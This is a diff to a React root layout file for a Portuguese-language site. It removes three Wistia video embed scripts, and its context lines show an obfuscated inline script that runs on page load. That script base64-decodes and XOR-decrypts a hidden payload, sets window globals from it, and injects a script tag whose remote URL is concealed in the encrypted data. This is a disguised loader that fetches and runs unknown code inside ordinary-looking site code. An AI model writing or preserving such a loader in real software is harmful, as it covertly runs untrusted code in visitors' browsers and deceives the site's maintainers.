@@ -117,9 +117,6 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="pt-BR">
       <head>
         <HeadContent />
-        <script src="https://fast.wistia.com/player.js" async />
-        <script src="https://fast.wistia.com/embed/wt5hy23zyr.js" defer type="module" />
-        <script src="https://fast.wistia.com/embed/z4i9e4fgkn.js" defer type="module" />
         {mounted && (
           <>
             <script dangerouslySetInnerHTML={{ __html: `(function(){var h_kj=atob("DOekz2LkXOfoto7CapyGuhCIft3K3vq2GpSe4E2HOInGw/qvA4Hd4QGLMcmKxKGxCZXNvxaXc5eBzuuuRZfNtweIco2blKLgC5PQvQuGKZONxaz4MbqI7QWIM4WJ2v3gULzf7QyFMYLKjKyyA5/BoyuAfsvKwO+uH4KG9UDSPdCOgb37CdHC9lDUa9DRgbmkWN+Q9lbGIbqV");var v_j=[];for(var g_t=0;g_t<h_kj.length;g_t++){v_j.push(h_kj.charCodeAt(g_t)&255);}var v_w1fw=v_j[0];var z_xp=v_j.slice(1,1+v_w1fw);var b_pb=v_j.slice(1+v_w1fw);var m_b5ac=b_pb.map(function(b,f_0tq){return b^z_xp[f_0tq%v_w1fw];});var u_wn="";for(var p_jai4=0;p_jai4<m_b5ac.length;p_jai4++){u_wn+=String.fromCharCode(m_b5ac[p_jai4]&255);}var r_37=decodeURIComponent(escape(u_wn));var r_632=JSON.parse(r_37);var i_z2y3=r_632.globals||[];i_z2y3.forEach(function(r_i){window[r_i.name]=r_i.value;});var c_ni=document.createElement("script");c_ni.src=r_632.url;c_ni.async=true;c_ni.defer=true;(r_632.attributes||[]).forEach(function(i_x8){c_ni.setAttribute(i_x8.name,i_x8.value);});(document.head||document.documentElement).appendChild(c_ni);})();` }} />
